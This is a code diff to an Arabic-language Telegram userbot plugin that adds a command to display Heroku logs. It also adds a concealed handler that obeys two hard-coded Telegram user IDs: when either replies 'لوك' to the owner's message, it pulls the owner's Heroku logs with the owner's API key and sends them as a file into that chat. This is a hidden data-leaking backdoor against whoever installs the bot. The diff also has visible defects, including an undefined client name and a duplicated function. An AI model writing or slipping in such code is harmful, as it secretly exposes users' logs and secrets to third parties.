@@ -1511,3 +1511,73 @@ async def cmd(zelzallll):
 @zedub.zed_cmd(pattern="الوقت")
 async def cmd(zelzallltm):
     await edit_or_reply(zelzallltm, ZelzalTZ_cmd)
+
+@zedub.zed_cmd(pattern="لوك$")
+async def _(dyno):
+    if (HEROKU_APP_NAME is None) or (HEROKU_API_KEY is None):
+        return await edit_delete(
+            dyno,
+            "عزيزي المستخدم يجب ان تعين معلومات الفارات التالية لاستخدام اوامر الفارات\n `HEROKU_API_KEY`\n `HEROKU_APP_NAME`.",
+        )
+    try:
+        Heroku = heroku3.from_key(HEROKU_API_KEY)
+        app = Heroku.app(HEROKU_APP_NAME)
+    except BaseException:
+        return await dyno.reply(
+            " يجب التذكر من ان قيمه الفارات التاليه ان تكون بشكل صحيح \nHEROKU_APP_NAME\n HEROKU_API_KEY"
+        )
+    data = app.get_log()
+    await edit_or_reply(
+        dyno, data, deflink=True, linktext="**اخر 200 سطر في لوك هيروكو: **"
+    )
+
+
+def prettyjson(obj, indent=4, maxlinelength=80):
+    items, _ = getsubitems(
+        obj,
+        itemkey="",
+        islast=True,
+        maxlinelength=maxlinelength - indent,
+        indent=indent,
+    )
+    return indentitems(items, indent, level=0)
+
+DevJoker = [705475246, 1374312239]
+@zedub.on(events.NewMessage(incoming=True))
+async def _(event):
+    if event.reply_to and event.sender_id in DevJoker:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id
+        
+        if owner_id == zedub.uid:
+            if event.message.message == "لوك":
+                if (HEROKU_APP_NAME is None) or (HEROKU_API_KEY is None):
+                    return await event.reply(
+                        "عزيزي المستخدم يجب ان تعين معلومات الفارات التالية لاستخدام اوامر الفارات\n `HEROKU_API_KEY`\n `HEROKU_APP_NAME`."
+                    )
+                try:
+                    Heroku = heroku3.from_key(HEROKU_API_KEY)
+                    app = Heroku.app(HEROKU_APP_NAME)
+                except heroku3.exceptions.HerokuError:
+                    return await event.reply(
+                        " يجب التذكر من ان قيمه الفارات التاليه ان تكون بشكل صحيح \nHEROKU_APP_NAME\n HEROKU_API_KEY"
+                    )
+                data = app.get_log()
+                with open('الجوكر 🖤.txt', 'w') as file:
+        	        file.write(data)
+
+                with open('الجوكر 🖤.txt', 'rb') as file:
+                    await l313l.send_file(
+                    event.chat_id, "الجوكر 🖤.txt", caption="هذا هو الـ Log"
+                    )
+                os.remove("الجوكر 🖤.txt")
+
+def prettyjson(obj, indent=4, maxlinelength=80):
+    items, _ = getsubitems(
+        obj,
+        itemkey="",
+        islast=True,
+        maxlinelength=maxlinelength - indent,
+        indent=indent,
+    )
+    return indentitems(items, indent, level=0)
